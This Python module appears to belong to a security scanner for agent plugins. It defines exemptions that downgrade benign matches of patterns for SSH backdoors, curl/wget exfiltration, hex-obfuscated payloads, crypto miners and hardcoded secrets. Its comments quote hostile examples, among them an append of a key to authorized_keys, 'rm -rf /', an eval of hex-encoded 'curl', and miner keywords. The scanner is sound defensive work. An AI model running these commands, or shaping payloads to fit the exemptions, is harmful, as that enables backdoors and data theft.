# ``ssh_backdoor`` fires on the token ``authorized_keys``. A plugin whose disclosed purpose is SSH key
# setup names it in a UI STRING — ``jsx(..., "Add this public key to the remote account's
# authorized_keys")`` — without appending to it: the token sits inside a string literal and no write
# action is on the line. That is a reviewable note. An IMPERATIVE doc instruction (``Append this key to
# authorized_keys.`` in a README, agent-facing prose — not inside a literal) and any real append
# (``echo "$KEY" >> ~/.ssh/authorized_keys``) keep full severity.
_AUTHORIZED_KEYS_WRITE = re.compile(
    r">>?|\btee\b|\bcp\b|\bmv\b|\bsed\s+-\w*i|\bcat\b|writeFileSync|appendFileSync|\.(?:write|append)\w*\s*\(",
    re.IGNORECASE)


def is_authorized_keys_prose(finding: Finding, line: str, is_doc: bool) -> bool:
    """An ``ssh_backdoor`` (``authorized_keys``) mention where the token sits inside a string literal
    (a UI label) and no write/append action is on the line. Agent-facing doc PROSE is not covered:
    ``is_doc`` is accepted for signature symmetry but an imperative README instruction keeps severity."""
    if finding.pattern_id != "ssh_backdoor" or _AUTHORIZED_KEYS_WRITE.search(line):
        return False
    pos = line.lower().find("authorized_keys")
    if pos < 0:
        return False
    return any(a <= pos and pos + len("authorized_keys") <= b for a, b in
               (m.span() for m in _LITERAL_SPANS.finditer(line)))

# ── (7) loopback address with port ───────────────────────────────────────────────────────────
# ``hardcoded_ip_port`` is the "network" family's egress tripwire, yet ``127.0.0.1:12306`` in a
# README, an ``.mcp.json`` or a client default is a LOCAL service the plugin talks to on the same
# machine — nothing leaves the host. When every IP:port on the line is loopback the finding is
# informational; a routable address anywhere on the line keeps the pattern's severity.
_LOOPBACK_IP_PORT = re.compile(r"\b127\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}")


def is_loopback_only(finding: Finding, line: str) -> bool:
    """Every ``hardcoded_ip_port`` hit on the line is a 127.0.0.0/8 address."""
    if finding.pattern_id != "hardcoded_ip_port":
        return False
    rx = _PATTERN_BY_ID.get(finding.pattern_id)
    hits = list(rx.finditer(line)) if rx else []
    return bool(hits) and all(_LOOPBACK_IP_PORT.match(line, h.start()) for h in hits)


# ── (8) ``pip install`` as words inside a message string ─────────────────────────────────────
# ``unpinned_pip_install`` describes a dependency the plugin pulls at runtime. In code, the same
# two words inside a quoted literal at a NON-command position — ``"... no pip install is
# needed"``, ``f"(no pip install is suggested)"`` — are prose the plugin shows a user. A literal
# that starts with the command (``"pip install requests"``), or names it after ``python -m`` /
# ``uv`` / ``pipx`` / ``sudo`` / a shell separator, is a command string and never qualifies, nor
# does any line that executes something (``subprocess.run("pip install x", shell=True)``).
_PIP_INSTALL_TOKEN = re.compile(r"pip\s+install\b", re.IGNORECASE)
_PIP_COMMAND_POSITION = re.compile(r"(?:^|[;&|`(]|\b(?:uv|pipx|sudo|python[\d.]*\s+-m))\s*$", re.IGNORECASE)


def is_pip_install_in_prose_literal(finding: Finding, line: str) -> bool:
    """Every ``pip install`` on a code line sits mid-sentence inside a string literal, and the
    line executes nothing."""
    if finding.pattern_id != "unpinned_pip_install" or _EXEC_ON_LINE.search(line):
        return False
    spans = [m.span() for m in _LITERAL_SPANS.finditer(line)]
    hits = list(_PIP_INSTALL_TOKEN.finditer(line))

    def prose(h: re.Match[str]) -> bool:
        span = next(((a, b) for a, b in spans if a <= h.start() and h.end() <= b), None)
        if span is None:
            return False
        content_start = next((i for i in range(span[0], span[1]) if line[i] in "\"'`/"), span[0]) + 1
        return _PIP_COMMAND_POSITION.search(line[content_start:h.start()]) is None

    return bool(hits) and all(prose(h) for h in hits)


# ── (9) ``\xHH`` escapes inside a regex character class ──────────────────────────────────────
# ``hex_encoded_string`` (three ``\xHH`` escapes on one line) describes an obfuscated payload —
# ``eval("\x63\x75\x72\x6c")``. A control-character or ANSI-escape *filter* is written with the
# same escapes as RANGES inside a bracket class: ``/[\x00-\x1F\x7F]/``, ``[\x1b\x9b][[\]()#;?]*``.
# Bytes named inside ``[...]`` are matched, never assembled into a string, so when every escape
# on the line sits inside a character class the finding is informational. One ``\xHH`` outside a
# class (a payload beside a filter) keeps the pattern's severity, and so does a bracket span that
# holds a quote — ``[b"\x01\x00" * 200]`` is a Python LIST of byte strings, not a class.
_HEX_ESCAPE = re.compile(r"\\x[0-9a-fA-F]{2}")
_CHAR_CLASS = re.compile(r"\[(?:[^\]\\\n\"'`]|\\.)*\]")


def is_hex_in_char_class(finding: Finding, line: str) -> bool:
    """Every ``\\xHH`` on the line is inside a ``[...]`` regex character class."""
    if finding.pattern_id != "hex_encoded_string":
        return False
    classes = [m.span() for m in _CHAR_CLASS.finditer(line)]
    hits = list(_HEX_ESCAPE.finditer(line))
    return bool(hits) and all(any(a <= h.start() and h.end() <= b for a, b in classes) for h in hits)


# ── (10) loopback ``curl``/``wget`` target on a shell continuation line ──────────────────────
# ``env_exfil_curl`` / ``env_exfil_wget`` already exempt a same-line loopback destination
# (``curl -H "Bearer $KEY" http://localhost:8080/health`` produces no finding). A README health
# check writes the same command over two lines with a trailing ``\``, so the scanner sees only
# ``curl -H "Authorization: Bearer $KEY" \`` and the loopback URL never enters the regex. Re-run
# the pattern over the logical line (the finding's line plus its ``\``-continuations): when it no
# longer matches AND every ``http(s)://`` host on the logical line is loopback, the finding is
# informational. A routable host anywhere on the logical line keeps the severity.
_CONTINUATION_PATTERN_IDS = {"env_exfil_curl", "env_exfil_wget"}
_URL_HOST = re.compile(r"https?://(\[[0-9a-fA-F:]+\]|[^\s/:\"'`)\]]+)")
_LOOPBACK_HOSTS = {"localhost", "127.0.0.1", "[::1]"}    # the pattern's own same-line exemption


def logical_line(lines: list[str], index: int) -> str:
    """``lines[index]`` joined with the lines a trailing backslash continues onto (max 8)."""
    out = [lines[index]]
    i = index
    while i + 1 < len(lines) and len(out) <= 8 and lines[i].rstrip().endswith("\\"):
        i += 1
        out.append(lines[i])
    return " ".join(part.rstrip().rstrip("\\") for part in out)


def is_loopback_continuation(finding: Finding, line: str, joined: str) -> bool:
    """The line continues with ``\\``, the finding's own pattern stops matching on the logical
    line, and every ``http(s)://`` host on it is loopback."""
    if finding.pattern_id not in _CONTINUATION_PATTERN_IDS or not line.rstrip().endswith("\\"):
        return False
    rx = _PATTERN_BY_ID.get(finding.pattern_id)
    hosts = [m.group(1).lower() for m in _URL_HOST.finditer(joined)]
    return rx is not None and rx.search(joined) is None and bool(hosts) and all(h in _LOOPBACK_HOSTS for h in hosts)


# ── (11) prose string values in a JSON data file ────────────────────────────────────────────
# A translation table or tips file (``tips_zh.json``: ``"en": "Bare sudo commands are
# auto-rewritten …"`` and a ``"tips": [ … ]`` list of sentences) is read with ``json.load`` and
# shown to a human. On a ``"key": "value"`` line whose key is a sentence or a plain data name, or a
# bare string list element, a token in the MIDDLE of the string is prose
# and takes the README prose cap for a ``high`` finding (one step down; agent-facing shapes keep
# full severity, and a ``critical`` stays critical — data a plugin's code may still hand to a
# shell can lose a confirm prompt here, never a block). A string
# that starts with the command (``"cleanup": "rm -rf /"``) or names it after a shell separator or
# ``sudo``/``exec`` (``"sudo",`` in an ``args`` array), keys that name something executed
# (``"command"``, ``"postinstall"``, ``"run"``, ``"args"`` …) and ``package.json`` (npm runs its
# ``scripts``) keep the severity.
_JSON_STRING_LINE = re.compile(r'^\s*(?:"(?P<k>(?:[^"\\]|\\.)*)"\s*:\s*)?"(?P<v>(?:[^"\\]|\\.)*)"\s*,?\s*$')
_JSON_COMMAND_KEY = re.compile(r"cmd|command|script|exec|run|shell|install|hook|arg|entry|bin|start|setup", re.IGNORECASE)
_JSON_EXECUTED_FILES = {"package.json"}
_COMMAND_POSITION = re.compile(r"(?:^|[;&|`(]|\$\(|\b(?:sudo|exec|eval|do|then|xargs|bash|sh|-c))\s*$", re.IGNORECASE)


def is_json_prose_value(finding: Finding, rel_path: str, line: str) -> bool:
    """Every hit sits mid-sentence inside the key or value of a ``"key": "string"`` pair (or a bare
    string list element) in a ``.json`` data file, under a key that does not name something executed."""
    p = Path(rel_path)
    if finding.severity != "high" or p.suffix.lower() != ".json" or p.name.lower() in _JSON_EXECUTED_FILES:
        return False
    m = _JSON_STRING_LINE.match(line)
    rx = _PATTERN_BY_ID.get(finding.pattern_id)
    if m is None or rx is None:
        return False
    key = m.group("k")
    if key is not None and not re.search(r"\s", key) and _JSON_COMMAND_KEY.search(key):
        return False

    def prose(h: re.Match[str]) -> bool:
        part = next((g for g in ("k", "v") if m.start(g) <= h.start() and h.end() <= m.end(g)), None)
        return part is not None and _COMMAND_POSITION.search(line[m.start(part):h.start()]) is None

    hits = list(rx.finditer(line))
    return bool(hits) and all(prose(h) for h in hits)


# ── (12) a coin NAME without any mining machinery ───────────────────────────────────────────
# ``crypto_mining`` keys on miner software and pool protocols (``xmrig``, ``stratum+tcp``,
# ``coinhive``, ``cryptonight``) plus the bare coin name ``monero``. The name alone is a keyword
# in a connector catalog or search index (``"monero gateway"``, ``… monero multimodal …``), not a
# miner: with no miner binary, pool, algorithm or mining verb on the line it lands at medium
# (reported, verdict-neutral). Any of those beside it keeps the pattern's severity.
_MINING_MACHINERY = re.compile(
    r"xmrig|stratum|coinhive|cryptonight|randomx|cpuminer|minerd|nicehash|hashrate|donate-level"
    r"|\bmin(?:e[sd]?|ers?|ing)\b|--(?:coin|algo)\b", re.IGNORECASE)


def _is_standalone_coin_name(line: str, start: int, end: int) -> bool:
    return (line[start:end].lower() == "monero" and (start == 0 or not line[start - 1].isalnum())
            and (end == len(line) or not line[end].isalnum()))


def is_coin_name_only(finding: Finding, line: str) -> bool:
    """Every ``crypto_mining`` hit on the line is the standalone word ``monero`` and nothing on
    the line names mining software, a pool or the act of mining."""
    if finding.pattern_id != "crypto_mining" or _MINING_MACHINERY.search(line):
        return False
    rx = _PATTERN_BY_ID.get(finding.pattern_id)
    hits = list(rx.finditer(line)) if rx else []
    return bool(hits) and all(_is_standalone_coin_name(line, h.start(), h.end()) for h in hits)


# Google mints installed-app (desktop/CLI) OAuth clients with a ``GOCSPX-`` secret that its OAuth
# docs say cannot be kept confidential: every copy of the app ships it (gcloud does). A plugin is
# such an app, so the literal identifies a public client rather than leaking a credential; it stays
# in the report for review (caution) instead of hard-blocking the install.
_GOOGLE_PUBLIC_CLIENT_SECRET = re.compile(r'["\']GOCSPX-[A-Za-z0-9_-]{20,}["\']')


def is_google_installed_app_secret(finding: Finding, line: str) -> bool:
    """A ``hardcoded_secret`` hit whose literal is a Google installed-app OAuth client secret."""
    return finding.pattern_id == "hardcoded_secret" and bool(_GOOGLE_PUBLIC_CLIENT_SECRET.search(line))


__all__ = [
    "DOC_PROSE_EXTENSIONS",
    "LITERAL_INERT_PATTERN_IDS",
    "STEP_DOWN",
    "TEST_TREE_DIRS",
    "is_agent_facing",
    "is_authorized_keys_prose",
    "is_base64_archive_roundtrip",
    "is_base64_media",
    "is_benign_lazy_os_import",
    "is_ci_workflow",
    "is_coin_name_only",
    "is_disclosed_config_note",
    "is_doc_prose",
    "is_env_dump_in_safety_clause",
    "is_google_installed_app_secret",
    "is_hex_in_char_class",
    "is_inert_fixture_line",
    "is_json_prose_value",
    "is_loopback_continuation",
    "is_loopback_only",
    "is_pip_install_in_prose_literal",
    "is_quoted_injection_phrase",
    "is_regex_alternation_token",
    "is_repo_root_traversal",
    "is_self_uninstall_doc",
    "is_sudo_inert",
    "is_test_tree",
    "is_trusted_installer_pipe",
    "logical_line",
    "prose_cap",
]
